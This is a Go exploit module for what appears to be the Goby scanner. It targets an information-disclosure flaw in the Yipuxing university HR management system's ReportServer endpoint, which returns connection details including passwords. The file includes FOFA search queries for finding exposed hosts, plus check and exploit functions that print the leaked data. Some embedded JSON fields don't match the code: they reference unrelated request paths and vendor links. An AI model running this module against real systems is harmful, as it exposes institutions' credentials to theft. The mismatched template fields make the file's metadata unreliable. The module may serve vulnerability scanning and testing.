package exploits

import (

	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "University human resource management system /ReportServer Information Disclosure Vulnerability",
    "Description": "<p>The university human resource management service platform system focuses on the development and promotion of human resource information products, helps enterprises to build a unified human resource intelligent platform, rapidly improve the talent management ability of enterprises, enhance the efficiency of human resource management, help employees grow rapidly, and assist enterprises to achieve intelligent decision-making.</p><p>Sensitive information leakage vulnerability exists in ReportServer, human resource management system of universities.</p>",
    "Product": "Yipuxing-University-HRMS",
    "Homepage": "http://www.epxing.com/",
    "DisclosureDate": "2024-10-23",
    "PostTime": "2024-10-24",
    "Author": "3013320359@qq.com",
    "FofaQuery": "body=\"FM_SYS_ID\" || body=\"product/recruit/website/RecruitIndex.jsp\" && body=\"formRequest\"",
    "GobyQuery": "body=\"FM_SYS_ID\" || body=\"product/recruit/website/RecruitIndex.jsp\" && body=\"formRequest\"",
    "Level": "1",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version: <a href=\"http://www.dlink.com.cn/\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p><a href=\"http://www.epxing.com/\">http://www.epxing.com/</a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://hacktwo.blog.csdn.net/article/details/143159083"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "keyinfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/de2api/engine/getEngine;.js",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "高校人力资源管理系统 /ReportServer 信息泄露漏洞",
            "Product": "易普行-高校人力资源管理系统",
            "Description": "<p>大学高校人力资源管理服务平台系统专注研发和推广人力资源信息化产品，帮助企业构建统一的人力资源数智化平台，快速提高企业人才管理能力，提升人力资源管理效率，帮助员工快速成长，协助企业实现智慧决策。<br></p><p>高校人力资源管理系统ReportServer存在敏感信息泄露漏洞 。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.epxing.com/\">http://www.epxing.com/</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "University human resource management system /ReportServer Information Disclosure Vulnerability",
            "Product": "Yipuxing-University-HRMS",
            "Description": "<p>The university human resource management service platform system focuses on the development and promotion of human resource information products, helps enterprises to build a unified human resource intelligent platform, rapidly improve the talent management ability of enterprises, enhance the efficiency of human resource management, help employees grow rapidly, and assist enterprises to achieve intelligent decision-making.</p><p>Sensitive information leakage vulnerability exists in ReportServer, human resource management system of universities.</p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:&nbsp;<a href=\"http://www.dlink.com.cn/\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p><a href=\"http://www.epxing.com/\">http://www.epxing.com/</a><br></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`

	postOrGet_eR5iB6jK := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig(fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		if !strings.Contains(resp.Utf8Html, "password") {
			return "", errors.New("no information")
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo": "password",
			}
			// 函数继承
			uploadFileFunc := postOrGet_eR5iB6jK

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"keyinfo": {"/ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo", "password"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_eR5iB6jK

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = "keyinfo：" + resp
			return expResult

		},
	))
}
